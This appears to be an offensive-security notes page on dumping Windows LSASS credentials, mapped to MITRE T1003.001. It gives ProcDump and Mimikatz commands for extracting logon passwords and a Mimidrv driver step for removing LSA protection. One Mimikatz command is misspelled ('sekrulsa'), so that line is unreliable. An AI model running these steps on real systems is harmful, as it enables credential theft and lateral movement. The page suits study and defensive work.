# Local Security Authority Subsystem Service (LSASS)

### Resources

1. **LSASS**

{% embed url="https://jumpcloud.com/it-index/what-is-the-local-security-authority-subsystem-service-lsass-exe" %}

2. **ProdDump**

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" %}

2. **Mimidrv in depth**

{% embed url="https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148" %}

3. **MITRE technique, OS Credential Dumping: LSASS Memory (T1003.001)**

{% embed url="https://attack.mitre.org/techniques/T1003/001/" %}

### What is LSASS?

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. The LSASS process stores user credentials in memory to enable users to access network resources, such as file shares and other network services, without needing to enter credentials each time.

Thus, the LSASS process is often targeted by attackers due to the sensitive information it contains about user accounts, to dump credentials for privilege escalation or lateral movement.

The following techniques can be used to exploit this (requires administrator privileges):

> As defined in the MITRE ATT\&CK framework: **OS Credential Dumping: LSASS Memory (T1003.001)**

### LSA protection

Note that the techniques to dump the LSASS process discussed below may not work due the implementation of the LSA protection, which aims to keep LSASS from being accessed to extract credentials from memory

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#enable-by-using-the-registry" %}

This protection can be enabled with the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key, by setting the `RunAsPPL`&#x20;

**dword** value to **1**.

However, a particular Mimikatz technique can be used to disable this protection (refer to the **Disable LSA protection** section below).&#x20;

### ProcDump

> ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike.

In our case, we will be using it to dump the LSASS process to disk:

```powershell
C:\> procdump.exe -accepteula -ma lsass.exe <dump_location>
```

* `-accepteula`:  to automatically accept the Sysinternals license agreement
* `-ma:` To write a 'Full' dump file
  * Includes all memory
  * Includes all metadata

### Mimikatz

We can also use Mimikatz to dump the contents of the LSASS process.

#### a. Dump directly from the live LSASS process (requires administrative privileges)

{% code title="Administrator shell" overflow="wrap" %}
```powershell
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekrulsa::logonpasswords
```
{% endcode %}

#### b. Extract from a previously dumped LSASS process file (does not require administrative privileges)

Given that we have previously dumped the LSASS process to a file named `lsass.dmp` using the `ProcDump` utility, we can use the following commands to extract information from the dumped file:

```powershell
mimikatz # sekurlsa::minidump lsass.dmp
```

### Disable LSA protection

**What is Mimidrv?**

Certain Windows functionalities such as disabling the LSA protection can't be performed from user mode. `Mimidrv.sys` driver works on kernel level to disable the LSA protection via a user mode application.

{% code title="Administrator shell" %}
```powershell
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove

# LSASS dump should now succeed
mimikatz # sekurlsa::logonpasswords 
```
{% endcode %}

* `!+`: To implant and start the `Mimidrv.sys` driver from user mode
* `!processprotect:` A function provided by Mimidrv to remove process protection. In our case, it will be the LSASS process.

Refer to the "_Mimidrv in depth_" resource link above for more information.

